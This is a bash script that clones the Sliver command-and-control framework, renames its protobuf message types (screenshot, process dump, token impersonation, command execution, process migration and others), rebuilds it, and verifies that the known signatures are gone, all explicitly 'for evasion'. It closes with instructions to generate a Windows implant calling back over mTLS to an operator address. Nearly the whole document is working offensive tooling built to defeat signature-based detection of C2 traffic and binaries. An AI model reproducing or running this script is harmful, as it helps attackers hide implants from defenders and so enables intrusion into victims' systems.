#!/bin/bash
# Complete Sliver Protobuf Modification Script
# Clones Sliver and modifies protobuf signatures for evasion

set -e

INSTALL_DIR="${1:-$HOME/sliver}"

echo "============================================"
echo "Sliver C2 Protobuf Signature Modifier"
echo "============================================"
echo ""

# Check if Sliver already exists
if [ -d "$INSTALL_DIR" ]; then
    read -p "Sliver directory already exists at $INSTALL_DIR. Remove and re-clone? (y/N): " -n 1 -r
    echo
    if [[ $REPLY =~ ^[Yy]$ ]]; then
        echo "[*] Removing existing Sliver directory..."
        rm -rf "$INSTALL_DIR"
    else
        echo "[*] Using existing Sliver directory..."
        cd "$INSTALL_DIR"
        # Restore to clean state
        echo "[*] Restoring vendor directory..."
        git checkout vendor/ 2>/dev/null || true
        if [ -d "protobuf.backup.original" ]; then
            echo "[*] Found previous backup, restoring..."
            rm -rf protobuf
            cp -r protobuf.backup.original protobuf
        fi
    fi
fi

# Clone Sliver if needed
if [ ! -d "$INSTALL_DIR" ]; then
    echo "[*] Cloning Sliver C2 Framework..."
    git clone https://github.com/BishopFox/sliver.git "$INSTALL_DIR"
    cd "$INSTALL_DIR"
else
    cd "$INSTALL_DIR"
fi

echo ""
echo "[*] Starting protobuf modification..."
echo ""

# Backup protobuf
if [ ! -d "protobuf.backup.original" ]; then
    echo "[*] Creating backup..."
    cp -r protobuf protobuf.backup.original
    echo "    Backup saved to protobuf.backup.original"
fi

echo ""
echo "[*] Step 1: Modifying protobuf definitions..."

# Define renaming mappings - INCLUDING ExecuteAssembly and ExecuteWindows
declare -A PROTO_RENAMES=(
    ["ScreenshotReq"]="SysScreenCaptureReq"
    ["Screenshot"]="SysScreenCapture"
    ["ProcessDumpReq"]="SysMemDumpReq"
    ["ProcessDump"]="SysMemDump"
    ["ImpersonateReq"]="SysTokenSwitchReq"
    ["Impersonate"]="SysTokenSwitch"
    ["PsReq"]="SysProcListReq"
    ["Ps"]="SysProcList"
    ["IfconfigReq"]="SysNetConfigReq"
    ["Ifconfig"]="SysNetConfig"
    ["NetstatReq"]="SysConnListReq"
    ["Netstat"]="SysConnList"
    ["LsReq"]="FileDirListReq"
    ["Ls"]="FileDirList"
    ["CdReq"]="FileDirChangeReq"
    ["Cd"]="FileDirChange"
    ["PwdReq"]="FileCurrentDirReq"
    ["Pwd"]="FileCurrentDir"
    ["MkdirReq"]="FileMakeDirReq"
    ["Mkdir"]="FileMakeDir"
    ["RmReq"]="FileRemoveReq"
    ["Rm"]="FileRemove"
    ["ExecuteReq"]="CmdExecuteReq"
    ["Execute"]="CmdExecute"
    ["ExecuteAssemblyReq"]="CmdExecuteAssemblyReq"
    ["ExecuteAssembly"]="CmdExecuteAssembly"
    ["ExecuteWindowsReq"]="CmdExecuteWindowsReq"
    ["ExecuteWindows"]="CmdExecuteWindows"
    ["UploadReq"]="FileUploadReq"
    ["Upload"]="FileUpload"
    ["DownloadReq"]="FileDownloadReq"
    ["Download"]="FileDownload"
    ["MigrateReq"]="ProcMigrateReq"
    ["Migrate"]="ProcMigrate"
)

# Apply renames to proto files only
for OLD in "${!PROTO_RENAMES[@]}"; do
    NEW="${PROTO_RENAMES[$OLD]}"
    echo "  [+] Renaming proto: $OLD -> $NEW"
    find protobuf -name "*.proto" -type f -exec sed -i "s/\b${OLD}\b/${NEW}/g" {} \;
done

echo ""
echo "[*] Step 2: Regenerating protobuf files..."
make pb || {
    echo "ERROR: make pb failed. Restoring backup..."
    rm -rf protobuf
    cp -r protobuf.backup.original protobuf
    exit 1
}

echo ""
echo "[*] Step 3: Updating Go code (protobuf references only)..."

# Get all non-vendor, non-generated Go files
FILES=$(find . -name "*.go" -type f ! -name "*.pb.go" ! -path "./vendor/*" ! -path "./.git/*")

# CRITICAL: Only modify protobuf package references, not standard library
for OLD in "${!PROTO_RENAMES[@]}"; do
    NEW="${PROTO_RENAMES[$OLD]}"
    echo "  [+] Updating protobuf references: $OLD -> $NEW"
    
    # Only replace in protobuf package contexts
    echo "$FILES" | xargs -I {} sed -i \
        -e "s/sliverpb\.${OLD}/sliverpb.${NEW}/g" \
        -e "s/\*sliverpb\.${OLD}/\*sliverpb.${NEW}/g" \
        -e "s/&sliverpb\.${OLD}/\&sliverpb.${NEW}/g" \
        -e "s/clientpb\.${OLD}/clientpb.${NEW}/g" \
        -e "s/\*clientpb\.${OLD}/\*clientpb.${NEW}/g" \
        -e "s/&clientpb\.${OLD}/\&clientpb.${NEW}/g" \
        -e "s/rpcpb\.${OLD}/rpcpb.${NEW}/g" \
        -e "s/case \*${OLD}:/case \*${NEW}:/g" \
        {}
done

# Special handling for message type constants
echo "  [+] Updating message type constants..."
echo "$FILES" | xargs -I {} sed -i \
    -e "s/MsgImpersonateReq/MsgSysTokenSwitchReq/g" \
    -e "s/MsgImpersonate/MsgSysTokenSwitch/g" \
    -e "s/MsgExecuteReq/MsgCmdExecuteReq/g" \
    -e "s/MsgExecute:/MsgCmdExecute:/g" \
    -e "s/MsgPsReq/MsgSysProcListReq/g" \
    -e "s/MsgPs:/MsgSysProcList:/g" \
    {}

echo ""
echo "[*] Step 4: Updating RPC client method calls..."

# Update RPC method calls: con.Rpc.Execute() -> con.Rpc.CmdExecute()
echo "  [+] Updating RPC method calls..."
echo "$FILES" | xargs -I {} sed -i \
    -e 's/\.Rpc\.Execute(/\.Rpc.CmdExecute(/g' \
    -e 's/\.Rpc\.ExecuteAssembly(/\.Rpc.CmdExecuteAssembly(/g' \
    -e 's/\.Rpc\.ExecuteWindows(/\.Rpc.CmdExecuteWindows(/g' \
    -e 's/\.Rpc\.Upload(/\.Rpc.FileUpload(/g' \
    -e 's/\.Rpc\.Download(/\.Rpc.FileDownload(/g' \
    -e 's/\.Rpc\.Ls(/\.Rpc.FileDirList(/g' \
    -e 's/\.Rpc\.Cd(/\.Rpc.FileDirChange(/g' \
    -e 's/\.Rpc\.Pwd(/\.Rpc.FileCurrentDir(/g' \
    -e 's/\.Rpc\.Mkdir(/\.Rpc.FileMakeDir(/g' \
    -e 's/\.Rpc\.Rm(/\.Rpc.FileRemove(/g' \
    -e 's/\.Rpc\.Ps(/\.Rpc.SysProcList(/g' \
    -e 's/\.Rpc\.Ifconfig(/\.Rpc.SysNetConfig(/g' \
    -e 's/\.Rpc\.Netstat(/\.Rpc.SysConnList(/g' \
    -e 's/\.Rpc\.ProcessDump(/\.Rpc.SysMemDump(/g' \
    -e 's/\.Rpc\.Screenshot(/\.Rpc.SysScreenCapture(/g' \
    -e 's/\.Rpc\.Impersonate(/\.Rpc.SysTokenSwitch(/g' \
    -e 's/\.Rpc\.Migrate(/\.Rpc.ProcMigrate(/g' \
    {}

echo ""
echo "[*] Step 5: Fixing CLI framework methods..."

# Fix CLI Execute methods that should NOT have been renamed
echo "  [+] Restoring CLI framework Execute() methods..."
find server/cli client/cli -name "*.go" -exec sed -i \
    -e 's/func CmdExecute(/func Execute(/g' \
    -e 's/) CmdExecute(/) Execute(/g' \
    -e 's/\.CmdExecute(/\.Execute(/g' \
    {} +

# Fix template Execute methods
echo "$FILES" | xargs -I {} sed -i \
    -e 's/tmpl\.CmdExecute/tmpl.Execute/g' \
    -e 's/template\.CmdExecute/template.Execute/g' \
    -e 's/cmd\.CmdExecute/cmd.Execute/g' \
    -e 's/\.handler\.CmdExecute/\.handler.Execute/g' \
    {}

echo ""
echo "[*] Step 6: Restoring standard library calls..."

# CRITICAL: Restore any standard library calls that got renamed
echo "  [+] Restoring os.* and filepath.* calls..."
echo "$FILES" | xargs -I {} sed -i \
    -e 's/os\.FileMakeDir/os.Mkdir/g' \
    -e 's/os\.FileRemove/os.Remove/g' \
    -e 's/os\.FileUpload/os.Upload/g' \
    -e 's/os\.FileDownload/os.Download/g' \
    -e 's/os\.FileDirList/os.ReadDir/g' \
    -e 's/filepath\.FileMakeDir/filepath.Mkdir/g' \
    -e 's/filepath\.FileRemove/filepath.Remove/g' \
    {}

# Fix io.Reader/Writer if they got renamed
echo "$FILES" | xargs -I {} sed -i \
    -e 's/reader\.FileUpload/reader.Upload/g' \
    -e 's/writer\.FileUpload/writer.Upload/g' \
    -e 's/reader\.FileDownload/reader.Download/g' \
    -e 's/writer\.FileDownload/writer.Download/g' \
    {}

echo ""
echo "[*] Step 7: Compiling Sliver..."
echo ""

if make; then
    echo ""
    echo "============================================"
    echo "✅ SUCCESS! Modified Sliver is ready!"
    echo "============================================"
    echo ""
    echo "Installation directory: $INSTALL_DIR"
    echo ""
    echo "Binaries:"
    ls -lh sliver-server sliver-client 2>/dev/null
    echo ""
    echo "Verify modifications:"
    echo "  cd $INSTALL_DIR"
    if strings sliver-server | grep -q "\.sliverpb\.ScreenshotReq\|\.sliverpb\.ProcessDumpReq\|\.sliverpb\.ImpersonateReq"; then
        echo "  ❌ WARNING: Old signatures still present"
    else
        echo "  ✅ Protobuf signatures successfully modified"
    fi
    echo ""
    echo "Start Sliver:"
    echo "  cd $INSTALL_DIR"
    echo "  ./sliver-server"
    echo ""
    echo "In another terminal:"
    echo "  cd $INSTALL_DIR"
    echo "  ./sliver-client"
    echo ""
    echo "Test generation:"
    echo "  sliver > generate --os windows --mtls <YOUR_IP> --save test.exe"
    echo ""
    echo "Backup location: $INSTALL_DIR/protobuf.backup.original"
    echo ""
else
    echo ""
    echo "============================================"
    echo "❌ Compilation failed"
    echo "============================================"
    echo ""
    echo "Check errors above. To restore:"
    echo "  cd $INSTALL_DIR"
    echo "  rm -rf protobuf"
    echo "  cp -r protobuf.backup.original protobuf"
    echo "  make"
    echo ""
    exit 1
fi
